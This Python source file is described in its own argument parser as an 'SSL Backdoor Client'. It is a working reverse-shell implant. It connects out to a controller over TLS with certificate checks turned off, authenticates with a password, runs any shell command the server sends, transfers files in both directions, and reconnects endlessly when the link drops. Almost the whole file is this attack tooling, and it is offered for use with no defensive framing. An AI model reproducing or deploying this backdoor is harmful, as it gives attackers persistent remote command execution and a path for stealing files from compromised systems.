import socket
import json
import subprocess
import os
import base64
import logging
import time
import ssl
import struct
import sys
import argparse

# Constants
BUFFER_SIZE = 8192
TIMEOUT = 30
CERT_FILE = 'server.crt'  # For demo, accept server's self-signed cert

# Configure logging
logging.basicConfig(
    filename='client.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

# Global variable to track current working directory
current_directory = os.getcwd()

def connect_to_server(ip, port, max_retries=None):
    retry_count = 0
    while max_retries is None or retry_count < max_retries:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE  # Accept self-signed for demo
            connection = context.wrap_socket(sock, server_hostname=ip)
            connection.connect((ip, port))
            logging.info(f"Connected to {ip}:{port} (SSL)")
            return connection
        except Exception as e:
            logging.error(f"Connection failed (attempt {retry_count + 1}): {e}")
            print(f"[-] Connection failed. Retrying in 5 seconds...")
            time.sleep(5)
            retry_count += 1
    raise Exception("Max retries reached. Giving up.")

def send_json(connection, data):
    try:
        json_data = json.dumps(data).encode('utf-8')
        length = struct.pack('>I', len(json_data))
        connection.sendall(length + json_data)
    except Exception as e:
        logging.error(f"Send error: {e}")
        raise

def receive_json(connection):
    try:
        connection.settimeout(TIMEOUT)
        raw_length = b''
        while len(raw_length) < 4:
            chunk = connection.recv(4 - len(raw_length))
            if not chunk:
                raise Exception("Connection closed while reading length prefix")
            raw_length += chunk
        msg_length = struct.unpack('>I', raw_length)[0]
        data = b''
        while len(data) < msg_length:
            chunk = connection.recv(min(BUFFER_SIZE, msg_length - len(data)))
            if not chunk:
                raise Exception("Connection closed while reading data")
            data += chunk
        return json.loads(data.decode('utf-8'))
    except socket.timeout:
        logging.error("Receive timeout")
        raise Exception("Receive timeout")
    except Exception as e:
        logging.error(f"Receive error: {e}")
        raise

def is_safe_path(basedir, path):
    # Prevent path traversal
    return os.path.abspath(os.path.join(basedir, path)).startswith(os.path.abspath(basedir))

def execute_command(command):
    global current_directory
    try:
        # Handle cd command specially
        if command.lower().startswith('cd '):
            new_dir = command[3:].strip()
            if new_dir == '..':
                current_directory = os.path.dirname(current_directory)
            elif os.path.isabs(new_dir):
                current_directory = new_dir
            else:
                current_directory = os.path.join(current_directory, new_dir)
            if not os.path.exists(current_directory):
                current_directory = os.getcwd()
                return f"Error: Directory '{new_dir}' does not exist"
            return f"Changed directory to: {current_directory}"
        elif command.lower() == 'pwd':
            return current_directory
        elif command.lower() == 'ls':
            return "\n".join(os.listdir(current_directory))
        # Execute other commands in the current directory
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            cwd=current_directory
        )
        if result.returncode == 0:
            response = result.stdout
            if not response:
                response = "Command executed successfully (no output)"
        else:
            response = f"Error: {result.stderr}"
        return response
    except subprocess.TimeoutExpired:
        return "Error: Command timed out"
    except Exception as e:
        return f"Error executing command: {str(e)}"

def run(connection, password):
    authenticated = False
    while True:
        try:
            msg = receive_json(connection)
            if isinstance(msg, dict) and msg.get("auth") == True:
                send_json(connection, {"password": password})
                resp = receive_json(connection)
                if resp.get("auth") == "ok":
                    authenticated = True
                    break
                else:
                    print("[-] Authentication failed.")
                    return
            else:
                print("[-] Unexpected protocol. Exiting.")
                return
        except Exception as e:
            print(f"[-] Auth handshake error: {e}")
            return
    print("[+] Authenticated!")
    while True:
        try:
            command_msg = receive_json(connection)
            command = command_msg.get("cmd") if isinstance(command_msg, dict) else command_msg
            if not isinstance(command, str):
                send_json(connection, "Invalid command format")
                continue
            if command.lower() == 'exit':
                send_json(connection, "Disconnecting...")
                break
            elif command[:6].lower() == 'upload':
                try:
                    send_json(connection, "READY_TO_RECEIVE")
                    file_data = receive_json(connection)
                    filename = command[7:].strip()
                    if file_data != "FileNotFound":
                        if not is_safe_path('.', filename):
                            send_json(connection, "UPLOAD_ABORT")
                            continue
                        with open(filename, 'wb') as f:
                            f.write(base64.b64decode(file_data))
                        send_json(connection, f"Uploaded: {filename}")
                    else:
                        send_json(connection, "File not found on server")
                except Exception as e:
                    send_json(connection, f"Upload failed: {str(e)}")
                    logging.error(f"Upload error: {e}")
            elif command[:8].lower() == 'download':
                try:
                    filename = command[9:].strip()
                    if not is_safe_path('.', filename):
                        send_json(connection, "FileNotFound")
                        continue
                    if os.path.exists(filename):
                        with open(filename, 'rb') as f:
                            file_data = base64.b64encode(f.read()).decode('utf-8')
                        send_json(connection, file_data)
                    else:
                        send_json(connection, "FileNotFound")
                except Exception as e:
                    send_json(connection, f"Download failed: {str(e)}")
                    logging.error(f"Download error: {e}")
            else:
                result = execute_command(command)
                send_json(connection, result)
        except Exception as e:
            logging.error(f"Runtime error: {e}")
            break

def main():
    parser = argparse.ArgumentParser(description="SSL Backdoor Client")
    parser.add_argument('--server-ip', type=str, default='127.0.0.1', help='Server IP address')
    parser.add_argument('--server-port', type=int, default=4444, help='Server port')
    parser.add_argument('--password', type=str, default='changeme123', help='Authentication password')
    args = parser.parse_args()
    conn = None
    try:
        while True:
            try:
                conn = connect_to_server(args.server_ip, args.server_port, max_retries=None)
                run(conn, args.password)
            except Exception as e:
                logging.error(f"Connection lost: {e}")
                print(f"[-] Connection lost. Reconnecting in 5 seconds...")
                time.sleep(5)
            finally:
                if conn:
                    conn.close()
                    conn = None
    except KeyboardInterrupt:
        print("\n[!] Client stopped by user.")
        logging.info("Client stopped manually.")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
    finally:
        if conn:
            conn.close()

if __name__ == "__main__":
    main()
